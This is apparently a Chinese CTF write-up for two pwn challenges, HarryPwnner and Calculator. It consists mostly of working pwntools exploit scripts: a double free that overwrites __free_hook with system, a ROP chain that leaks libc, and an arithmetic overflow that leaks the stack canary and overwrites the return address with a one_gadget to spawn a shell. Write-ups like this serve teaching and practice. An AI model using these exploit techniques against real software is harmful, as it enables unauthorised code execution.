# HarryPwnner

这题是当时的pwn3

realloc的size为0时，相当于free，于是有一个double free的漏洞,常规的利用

```python

from pwn import *

def cmd(command):
	p.recvuntil(">> ")
	p.sendline(str(command))

def add(sz,content):
	cmd(1)
	p.recvuntil("How much power do you want: ")
	p.sendline(str(sz))
	p.recvuntil("curse: ")
	p.send(content)

def edit(idx,sz,content):
	cmd(2)
	p.recvuntil("Tell me which wand: ")
	p.sendline(str(idx))
	p.recvuntil("How much power do you want: ")
	p.sendline(str(sz))
	p.recvuntil("curse: ")
	p.send(content)
	
def dele(idx):
	cmd(3)
	p.recvuntil("Tell me which wand: ")
	p.sendline(str(idx))

def main(host, port=9999):
	global p
	if host:
		p = remote(host, port)
	else:
		
		p = process('./HarryPwnner')
		
	
	add(0x68,"A")
	add(0x68,"B")
	add(0x100,"C")
	add(0x68,"D")
	
	dele(2)
	
	cmd(2)
	p.recvuntil("Tell me which wand: ")
	p.sendline(str(0))
	p.recvuntil("How much power do you want: ")
	p.sendline(str(0))
	
	dele(1)
	dele(0)
	
	
	add(0x68,p64(0x60303d))
	add(0x68,"A")
	add(0x68,"B")
	buf = 0x000000000603060
	add(0x68,"\x00"*0x13+p64(buf))
	gdb.attach(p,"b *0x000000000401302")
	t = int(raw_input("guess: "))
	stdout = (t << 12) | 0x620
	# stdout = 0xc620
	
	add(0x68,p16(stdout-0x43))
	
	
	
	dele(2)
	dele(1)
	edit(0,0x68,p64(buf)*5+"\x80")
	edit(5,0x68,"\xe0")
	
	add(0x68,"A")
	add(0x68,"/bin/sh\x00")
	add(0x68,"\x00"*0x33+p64(0xfbad1800)+p64(0)*3+"\x00")
	
	# p.recv()
	p.recv(0x40)
	libc.address = u64(p.recv(8))-0x3c5600
	info("libc : " + hex(libc.address))
	
	edit(0,0x68,p64(buf)+p64(libc.symbols["__free_hook"]))
	edit(1,0x68,p64(libc.symbols["system"]))
	
	dele(7)
	
	
	p.interactive()


if __name__ == '__main__':
	libc = ELF("./libc-2.23.so",checksec=False)
	main(args["REMOTE"])


```
赛后交流发现后面还有一个栈溢出的漏洞，当时打比赛的时候知道有这个漏洞，但是不知道怎么利用，太菜了

```python

from pwn import *

def cmd(command):
	p.recvuntil(">> ")
	p.sendline(str(command))

def add(sz,content):
	cmd(1)
	p.recvuntil("How much power do you want: ")
	p.sendline(str(sz))
	p.recvuntil("curse: ")
	p.send(content)

def edit(idx,sz,content):
	cmd(2)
	p.recvuntil("Tell me which wand: ")
	p.sendline(str(idx))
	add(sz,content)
	
def dele(idx):
	cmd(3)
	p.recvuntil("Tell me which wand: ")
	p.sendline(str(idx))

def main(host, port=9999):
	global p
	if host:
		p = remote(host, port)
	else:
		
		p = process('./HarryPwnner')
		gdb.attach(p,"b *0x00000000004010D8")
	# p.kill()
	for i in range(0x10):
		add(0x68,"A")
	cmd(4)
	p.recvuntil("How much power do you want?")
	p.sendline(str(0x2000))
	p.recvuntil("Input your final curse:")
	
	# 0x00000000004013f3 : pop rdi ; ret
	# 0x00000000004013f1 : pop rsi ; pop r15 ; ret
	# 0x00000000004013ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
	pppp_ret = 0x00000000004013ed
	p_rsi = 0x00000000004013f1
	p_rdi = 0x00000000004013f3
	bss = 0x0000000000603900 
	
	payload = "Expelliarmus".ljust(0x1010,"\x00")+p64(bss-8)+p64(p_rdi)
	payload += p64(elf.got["puts"])+p64(elf.symbols["puts"])
	payload += p64(p_rdi)+p64(0)+p64(p_rsi)
	payload += p64(bss) +p64(0) + p64(elf.symbols["read"])+p64(pppp_ret)
	payload += p64(bss-0x18)
	payload = payload.ljust(0x2000,"\x00")
	p.send(payload)
	p.recvuntil("enemy's shell.\n")
	libc.address = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))-libc.symbols["puts"]
	# payload = p64(p_rdi)+p64(libc.search("/bin/sh\x00").next())+p64(libc.symbols["system"])
	p.send(p64(libc.address+0xf1147))
	p.interactive()


if __name__ == '__main__':
	libc = ELF("./libc-2.23.so",checksec=False)
	elf = ELF("./HarryPwnner",checksec=False)
	main(args["REMOTE"])
    
```
看了樱花师傅的博客懂的，orz

参考链接： [http://eternalsakura13.com/2018/04/24/starctf_babystack/](http://eternalsakura13.com/2018/04/24/starctf_babystack/)

# Calculator

这是当时的pwn5,阿鹏大佬的题，orz，搞了好久，最后要了ppt才解出来

程序有个bignum的结构体
```c
struct bignum{
	int len;
	char* num;
};
```

程序会根据我们输入的质数（小于255）进行相乘，然后输入's'的话会输出结果并重置bignum，输入'q'退出

我们可以一直输入质数让程序做乘法，这样结果就会溢出到canary，或者返回地址，先泄露，最后覆盖返回地址的恢复canary，要注意的是，覆盖的时候要从高到低一位一位的覆盖，一步覆盖不太可能。

这里主要的问题是生成符合结果的长度为n的数，考虑到 0xff = 3 * 5 * 17，所以我们可以先生成pow(0xff,n-1),pow(0xff,n-2),pow(0xff,n-3),然后爆破剩下的因子即可，爆破的时间很快，大概4-7秒左右即可覆盖返回地址为onegadget和canary

```python
from pwn import *

def is_prime(n):
	if n < 3:
		return 0
	else:
		i = 2
		while i*i <= n:
			if n % i == 0:
				return 0
			i = i + 1			
	return 1



def bforce(length,value,byte=1):
	t1 = 0xff**(length-1)
	t2 = 0xff**(length-2)
	t3 = 0xff**(length-3)
	l = []
	for i in prime:
		if (t1*i)>>(length*8-8*byte) == value:
			l.append(i)
			bf(length-1,l)
			return 1
		
	for i in prime:
		for j in prime:
			if (t2*i*j)>>(length*8-8*byte) == value:
				l.append(i)
				l.append(j)
				bf(length-2,l)
				return 1
			if ((t1*i*j)>>(length*8-8*byte)) == value and (len(hex(t1*i*j))-3 <= length*2 and len(hex(t1*i*j))-3 > length*2-2):
				l.append(i)
				l.append(j)
				bf(length-1,l)
				return 1
	
	for i in prime:
		for j in prime:
			for k in prime:
				if (t3*i*j*k)>>(length*8-8*byte) == value:
					l.append(i)
					l.append(j)
					l.append(k)
					bf(length-3,l)
					return 1
				if ((t1*i*j*k)>>(length*8-8*byte)) == value and (len(hex(t1*i*j*k))-3 <= length*2 and len(hex(t1*i*j*k))-3 > length*2-2):
					l.append(i)
					l.append(j)
					l.append(k)
					bf(length-1,l)
					return 1
				if ((t2*i*j*k)>>(length*8-8*byte)) == value and (len(hex(t2*i*j*k))-3 <= length*2 and len(hex(t2*i*j*k))-3 > length*2-2):
					l.append(i)
					l.append(j)
					l.append(k)
					bf(length-2,l)
					return 1
	return -1
def bf(length,l):
	for i in range(length):
		p.recvuntil(">> ")
		p.sendline("3")
		p.recvuntil(">> ")
		p.sendline("5")
		p.recvuntil(">> ")
		p.sendline("17")
	for i in l:
		p.recvuntil(">> ")
		p.sendline(str(i))
	p.recvuntil(">> ")
	p.sendline("s")

def main(host, port=9999):
	global p
	if host:
		p = remote(host, port)
	else:
		p = process('./calculator')
		# gdb.attach(p)
	# 03:0018	   0x7ffe2a978d48 -> 0x5
	# 04:0020      0x7ffe2a978d50 -> 0x7ffe2a978d58 -> 0xe7f52a28cb
	# 05:0028      0x7ffe2a978d58 -> 0xe7f52a28cb
	# 06:0030      0x7ffe2a978d60 -> 0x0
	# 07:0038      0x7ffe2a978d68 -> 0x8933db3a9e9dee00
	# 08:0040 rbp  0x7ffe2a978d70 -> 0x5653c4328f20 -> push   r15
	# 09:0048      0x7ffe2a978d78 -> 0x7f7388e22830 (__libc_start_main+240) -> mov    edi, eax
	
	global prime
	prime = []
	for i in range(2,256):
		if is_prime(i):
			prime.append(i)
	
	for i in range(17):
		p.recvuntil(">> ")
		p.sendline("251")
	p.recvuntil(">> ")
	p.sendline("s")
	p.recvuntil("Result: ")
	canary = int(p.recv(16),16)<<8
	
	
	for i in range(33):
		p.recvuntil(">> ")
		p.sendline("251")
	p.recvuntil(">> ")
	p.sendline("s")
	p.recvuntil("Result: ")
	libc = int(p.recv(14),16)-0x20885
	info("libc : " + hex(libc))
	
	# 0x45216	execve("/bin/sh", rsp+0x30, environ)
	# constraints:
	# rax == NULL
	
	onegadget = libc + 0x45216
	
	
	
	for i in range(35,32,-1):
		bforce(i,ord(p64(onegadget)[i-33]))
	
	for i in range(24,18,-1):
		bforce(i,ord(p64(canary)[i-17]))
	info("canary : " + hex(canary))
	info("onegadget : " + hex(onegadget))
	
	
	# 67/255 
	if bforce(18,u16(p64(canary)[:2]),2) == -1:
		info("fail!")
		exit()
	
	p.recvuntil(">> ")
	p.sendline("q")
	p.interactive()


if __name__ == '__main__':
	
	main(args["REMOTE"])
	


```
